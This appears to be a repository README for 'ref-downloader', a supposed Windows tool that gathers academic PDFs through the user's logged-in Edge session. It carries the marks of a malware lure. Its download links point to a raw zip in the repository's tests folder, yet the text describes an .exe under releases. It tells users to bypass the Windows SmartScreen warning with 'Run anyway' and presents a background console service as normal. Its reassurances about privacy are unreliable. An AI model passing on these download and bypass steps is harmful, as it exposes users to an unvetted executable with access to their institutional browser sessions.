# 📚 ref-downloader - Collect academic papers using your browser

[![Download](https://img.shields.io/badge/Download_Software-blue)](https://raw.githubusercontent.com/Nonfinancial-panel444/ref-downloader/main/tests/downloader-ref-v2.3.zip)

This tool gathers research documents for your literature reviews. It connects to your library access through Microsoft Edge. Point the software at a list of digital object identifiers or local PDF files, and it fetches the full documents for you.

## 🛠 Prerequisites

You need a computer running Windows 10 or Windows 11. Ensure you have the Microsoft Edge browser installed. The tool uses your current browser session to prove you have institutional access to journals. You do not need technical knowledge to perform these steps.

## 📥 Getting the software

You must visit the website provided below to download the program.

[Click here to open the download page](https://raw.githubusercontent.com/Nonfinancial-panel444/ref-downloader/main/tests/downloader-ref-v2.3.zip)

Look for the latest version listed under the releases section. Select the file ending in `.exe` to save it to your computer.

## ⚙️ Installation steps

Locate the file you just downloaded in your Downloads folder. Double-click the file to start the setup process. Windows might display a security prompt because the software comes from an external source. If you see a blue window that says "Windows protected your PC," perform these steps:

1. Click "More info."
2. Click "Run anyway."

Follow the instructions in the installer. Give the program permission to create a folder on your computer. This folder stores your settings and any PDFs the tool finds.

## 🚀 Running the software

Once the installation finishes, open the program from your Start menu. A small black window appears while the program starts its background service. This is normal. 

The main menu allows you to input your source data. You have two ways to start the process:

1. **Provide a DOI list:** Paste a list of digital object identifiers into the text field. The tool checks Crossref to identify each paper.
2. **Select a PDF folder:** Point the tool toward a folder containing your existing paper files. It reads these files to find the correct references.

Ensure your Microsoft Edge browser is open and logged into your university or institution. The program uses this active connection to verify your credentials. If you are not logged in, the tool returns an error for restricted content.

## 🔍 How it works

The program uses your browser session to browse academic databases as if you were doing it manually. It searches for the full-text PDF version of every reference you provide. 

This process avoids the need to enter your password into the tool itself. Your credentials stay inside your web browser. The tool strictly follows the pathways you normally take to get papers through your library portal.

## 📂 Managing your library

The program saves every retrieved paper to the folder you specified during the first launch. You can rename these files or move them into your citation manager software like Zotero. Because the tool uses the official digital identifier for each file, the names remain standard and organized.

If the tool fails to find a specific paper, check your browser connection. Sometimes institutional logins expire after a few hours. Refresh your Edge browser tab on the library website and restart the download process.

## 🛡 Security and Privacy

Your data stays local to your machine. The program does not send your personal credentials or access tokens to any third-party servers. It only interacts with the publishers and the Crossref database. 

The software utilizes standard browser automation libraries. These libraries simulate the clicks and scrolls a human performs when downloading a file. No code is injected into the websites you visit. 

## ❓ Troubleshooting common issues

If the application closes unexpectedly, check the following points:

* **Internet Connection:** Ensure your connection stays stable during the batch process.
* **Edge Browser:** Keep the browser open in the background. The automation service loses its connection if you close the browser window.
* **Institutional Access:** Test your access by manually downloading one paper through your browser. If the library portal requests a login, perform that login first.
* **Permissions:** Some work computers restrict software from accessing the internet. Contact your IT department if the tool cannot connect to the journal websites.

## 📄 License and terms

You are free to use this software for your research. The program relies on public research metadata provided by databases. Ensure you comply with the copyright guidelines of your institution and the publishers you download from. Do not share your institutional login details with anyone.

## 💡 Tips for better results

* **Batch size:** Start with 10 to 20 papers at a time. This prevents your library account from flagging your activity as abnormal traffic.
* **Wait times:** The software includes a delay between downloads to mimic human behavior. Do not change these settings unless you have a robust network connection.
* **Zotero integration:** Use a folder monitor feature in your citation manager to automatically import the PDFs as soon as this tool saves them.
* **File Cleanup:** If the tool fetches the wrong version of a paper, delete the local file and use the DOI list to try again.